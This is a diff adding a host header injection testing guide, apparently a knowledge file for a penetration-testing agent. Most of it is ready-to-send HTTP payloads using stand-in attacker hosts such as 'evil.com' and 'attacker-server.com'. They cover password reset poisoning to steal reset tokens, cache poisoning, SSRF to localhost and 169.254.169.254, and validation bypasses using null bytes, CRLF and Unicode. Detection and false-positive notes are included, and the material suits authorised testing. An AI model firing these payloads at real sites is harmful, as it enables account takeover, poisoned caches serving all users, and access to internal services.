@@ -1,0 +1,313 @@
+<host_header_injection_guide>
+<title>HOST HEADER INJECTION</title>
+
+<critical>Host header injection occurs when applications trust the Host header for security-critical operations like generating password reset links, constructing URLs, or caching decisions. Attackers can manipulate this header to poison caches, redirect users, steal credentials, and bypass access controls. Modern applications with virtual hosting, load balancers, and CDNs are particularly susceptible.</critical>
+
+<scope>
+- Password reset link poisoning
+- Cache poisoning via Host header
+- Web cache deception
+- SSRF through Host header manipulation
+- Virtual host routing bypass
+- Access control circumvention
+- Open redirect via Host header
+</scope>
+
+<methodology>
+1. Identify functionality that uses the Host header (password reset, link generation, redirects).
+2. Test if the application accepts arbitrary Host header values.
+3. Probe for secondary headers that override Host (X-Forwarded-Host, X-Host, etc.).
+4. Attempt cache poisoning with manipulated Host values.
+5. Test for SSRF by routing requests to internal hosts.
+</methodology>
+
+<attack_vectors>
+<password_reset_poisoning>
+{% raw %}
+# Basic Host header manipulation
+POST /forgot-password HTTP/1.1
+Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@example.com
+
+# With legitimate host as backup
+POST /forgot-password HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: legitimate.com
+
+# Absolute URL in request
+POST https://legitimate.com/forgot-password HTTP/1.1
+Host: evil.com
+{% endraw %}
+</password_reset_poisoning>
+
+<header_variations>
+{% raw %}
+# Headers that may override Host
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+X-HTTP-Host-Override: evil.com
+Forwarded: host=evil.com
+X-Original-Host: evil.com
+X-Rewrite-URL: evil.com
+X-Original-URL: evil.com
+
+# Multiple Host headers
+Host: evil.com
+Host: legitimate.com
+
+# Host with port manipulation
+Host: legitimate.com:evil.com
+Host: legitimate.com@evil.com
+Host: evil.com#legitimate.com
+Host: evil.com?legitimate.com
+{% endraw %}
+</header_variations>
+
+<cache_poisoning>
+{% raw %}
+# Poison cache with malicious Host
+GET / HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: evil.com
+
+# Cache key manipulation
+GET /?cb=random HTTP/1.1
+Host: evil.com
+
+# Vary header exploitation
+GET / HTTP/1.1
+Host: legitimate.com
+X-Forwarded-Host: evil.com
+X-Cache-Key: legitimate.com
+{% endraw %}
+</cache_poisoning>
+
+<ssrf_via_host>
+{% raw %}
+# Internal host access
+Host: localhost
+Host: 127.0.0.1
+Host: internal-service.local
+Host: 169.254.169.254
+
+# Port manipulation
+Host: localhost:8080
+Host: internal:3000
+
+# With original host preserved
+X-Forwarded-Host: localhost
+X-Original-Host: internal-admin
+{% endraw %}
+</ssrf_via_host>
+</attack_vectors>
+
+<bypass_techniques>
+<validation_bypass>
+{% raw %}
+# Subdomain injection
+Host: evil.legitimate.com
+Host: legitimate.com.evil.com
+
+# Port-based bypass
+Host: legitimate.com:80@evil.com
+Host: legitimate.com:443@evil.com
+
+# Special character bypass
+Host: legitimate.com%00.evil.com
+Host: legitimate.com%0d%0a.evil.com
+Host: legitimate.com\.evil.com
+
+# Unicode normalization
+Host: legıtimate.com  # Turkish dotless i
+Host: legitⅰmate.com  # Roman numeral
+
+# Case manipulation
+Host: LEGITIMATE.com
+Host: Legitimate.Com
+{% endraw %}
+</validation_bypass>
+
+<double_host_headers>
+{% raw %}
+# First Host wins vs Last Host wins
+Host: evil.com
+Host: legitimate.com
+
+# With space injection
+Host: legitimate.com
+ Host: evil.com
+
+# Tab separated
+Host:	evil.com
+Host: legitimate.com
+{% endraw %}
+</double_host_headers>
+
+<absolute_url_attack>
+{% raw %}
+# Request line with absolute URL
+GET https://legitimate.com/path HTTP/1.1
+Host: evil.com
+
+# HTTP/1.0 behavior differences
+GET http://evil.com/path HTTP/1.0
+Host: legitimate.com
+{% endraw %}
+</absolute_url_attack>
+</bypass_techniques>
+
+<exploitation_scenarios>
+<password_reset_theft>
+{% raw %}
+# Attack flow:
+1. Attacker identifies password reset functionality
+2. Submits victim's email with manipulated Host header:
+   POST /forgot-password HTTP/1.1
+   Host: attacker-server.com
+   
+   email=victim@example.com
+   
+3. Victim receives email with: 
+   https://attacker-server.com/reset?token=secret_token
+   
+4. If victim clicks, attacker captures reset token
+5. Attacker uses token on legitimate site to reset password
+{% endraw %}
+</password_reset_theft>
+
+<cache_poisoning_attack>
+{% raw %}
+# Step 1: Identify cacheable response
+GET /static/main.js HTTP/1.1
+Host: legitimate.com
+# Response includes: X-Cache: HIT
+
+# Step 2: Poison with malicious Host
+GET /static/main.js HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: evil.com
+# If response uses Host for absolute URLs, inject malicious content
+
+# Step 3: Verify poisoning
+GET /static/main.js HTTP/1.1
+Host: legitimate.com
+# Check if cached response contains evil.com references
+{% endraw %}
+</cache_poisoning_attack>
+
+<virtual_host_bypass>
+{% raw %}
+# Access restricted virtual host
+Host: admin.internal.local
+Host: staging.example.com
+Host: dev.example.com
+
+# Backend routing manipulation
+X-Forwarded-Host: admin-panel
+X-Original-Host: restricted-vhost
+
+# IP-based virtual hosts
+Host: 10.0.0.1
+Host: 192.168.1.100
+{% endraw %}
+</virtual_host_bypass>
+
+<web_cache_deception>
+{% raw %}
+# Combine Host injection with cache deception
+GET /account/settings.css HTTP/1.1
+Host: legitimate.com
+X-Forwarded-Host: attacker.com
+
+# Force static file extension caching
+GET /api/user/profile.js HTTP/1.1
+Host: legitimate.com
+{% endraw %}
+</web_cache_deception>
+</exploitation_scenarios>
+
+<detection>
+<indicators>
+{% raw %}
+# Look for Host reflection in:
+- Password reset emails
+- Email confirmation links
+- Generated URLs in responses
+- Redirect locations
+- Canonical URLs
+- OpenGraph/meta tags
+- JavaScript configuration
+- API base URL configurations
+{% endraw %}
+</indicators>
+
+<testing_methodology>
+{% raw %}
+# Step 1: Baseline request
+GET / HTTP/1.1
+Host: legitimate.com
+# Note response content
+
+# Step 2: Modified Host
+GET / HTTP/1.1
+Host: test-injection.com
+# Compare response for Host reflection
+
+# Step 3: Secondary headers
+GET / HTTP/1.1
+Host: legitimate.com
+X-Forwarded-Host: test-injection.com
+# Check which header takes precedence
+
+# Step 4: Cache probing
+GET /?cachebust=random HTTP/1.1
+Host: test-injection.com
+# Check if cached responses affected
+{% endraw %}
+</testing_methodology>
+</detection>
+
+<validation>
+1. Demonstrate Host header value reflected in password reset links or URLs.
+2. Show cache poisoning with malicious Host affecting subsequent requests.
+3. Prove SSRF or internal host access via Host manipulation.
+4. Document which header variation (Host, X-Forwarded-Host, etc.) is vulnerable.
+5. Provide evidence of impact (stolen tokens, cached malicious content, access bypass).
+</validation>
+
+<false_positives>
+- Host header validated against allowlist
+- Absolute URLs hardcoded, not generated from Host
+- CDN/reverse proxy normalizing Host header
+- Application ignoring Host for URL generation
+- X-Forwarded-Host only accepted from trusted proxies
+</false_positives>
+
+<impact>
+- Account takeover via password reset poisoning
+- Cache poisoning affecting all users
+- Credential theft through link manipulation
+- SSRF accessing internal services
+- Virtual host access control bypass
+- Open redirect to phishing sites
+- Web cache deception information disclosure
+</impact>
+
+<pro_tips>
+1. Password reset is the highest-impact target for Host injection.
+2. Test X-Forwarded-Host first - often less validated than Host.
+3. Check cache headers (X-Cache, Age) to identify cacheable responses.
+4. Email preview tools help identify poisoned reset links.
+5. Multiple Host headers exploit parser differentials.
+6. Absolute URL in request line can override Host header.
+7. Port injection (Host: site.com:evil.com) bypasses some validations.
+8. Test staging/dev environments - often more permissive.
+9. API endpoints may have separate Host validation logic.
+10. Mobile apps often don't validate Host in server responses.
+</pro_tips>
+
+<remember>Host header injection weaponizes trust in HTTP headers. Applications must validate Host values against an explicit allowlist and never use them directly for security-critical operations. Password reset poisoning is the canonical high-impact exploit, but cache poisoning can affect entire user populations.</remember>
+</host_header_injection_guide>
